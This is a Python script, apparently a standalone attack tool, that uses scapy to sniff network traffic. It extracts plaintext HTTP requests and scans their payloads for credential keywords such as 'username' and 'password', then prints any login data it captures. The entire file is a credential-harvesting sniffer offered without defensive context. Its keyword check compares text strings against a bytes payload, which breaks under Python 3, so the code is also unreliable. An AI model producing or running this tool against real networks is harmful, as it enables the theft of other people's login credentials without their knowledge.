import scapy.all as scapy
from scapy.layers import http
from colorama import init, Fore

# initialize colorama
init()
# define colors
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
MAGENTA = Fore.MAGENTA


def sniff(interface=None):
    if interface:
        scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    else:
        scapy.sniff(store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        method = get_method(packet)
        print(f"\n{GREEN}[+] Requested {url} with {method}{RESET}")
        login_infos = get_login_info(packet)
        print(login_infos)
        if login_infos:
            print(f"\n{MAGENTA}[*] Some useful Raw data: {login_infos}{RESET}")


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_method(packet):
    return packet[http.HTTPRequest].Method.decode()


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        print(f"\n{RED}[*] Some useful Raw data: {packet[scapy.Raw].load}{RESET}")
        data = packet[scapy.Raw].load
        keywords = ["username", "login", "user", "password", "pass"]
        for keyword in keywords:
            if keyword in data:
                return data


sniff()
